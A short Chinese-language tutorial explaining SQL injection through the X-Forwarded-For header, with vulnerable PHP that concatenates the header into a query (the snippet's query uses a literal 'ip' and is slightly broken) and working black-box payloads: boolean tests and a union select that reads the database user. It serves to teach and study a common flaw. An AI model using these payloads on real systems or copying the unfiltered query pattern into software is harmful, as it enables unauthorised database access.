## 0x00 XFF注入原理
X-Forwarded-For 简称 XFF 头，它代表了客户端的真实 IP，通过修改他的值就可以伪造客户端 IP。XFF 并不受 gpc 影响，而且开发人员很容易忽略这个 XFF 头，不会对 XFF 头进行过滤。  
```php
<?php
echo "xff---".$_SERVER['HTTP_X_FORWARDED_FOR'];
?>
```
使用burp suite可以给 X-Forword-For 字段设置任意字符串，如果程序中获取这个值再带入数据库查询，就会造成sql注入。  
除了 X-Forwarded-For 还有 HTTP_CLIENT_IP 都可以由客户端控制值，所以服务端接受这两个参数的时候没有过滤会造成 SQL 注入或者更高的危害。  
## 0x01 代码分析
getenv('HTTP_X_FORWARDED_FOR')获取远程客户端 的HTTP_X_FORWARDED_FOR 的值 没有进行过滤，直接拼接SQL语句带入查询造成注入。
```php
$ip=getenv('HTTP_X_FORWARDED_FOR');
$sql="select * from login_ip where ip = 'ip'";
```

## 0x02 黑盒模式下的XFF注入攻击
X-Forwarded-for: 127.0.0.1'and 1=1#  
X-Forwarded-for: 127.0.0.1'and 1=2#  
两次提交返回不一样 存在 SQL 注入漏洞  
获取敏感信息  
X-Forwarded-for: 127.0.0.11'union select 1,2,3,user()#  
输入提交包 后看到页面返回 root@loclhost  

感触：无论什么类型的注入，都是在后端直接把参数拼接进sql语句中带入数据库查询，从而造成SQL注入漏洞。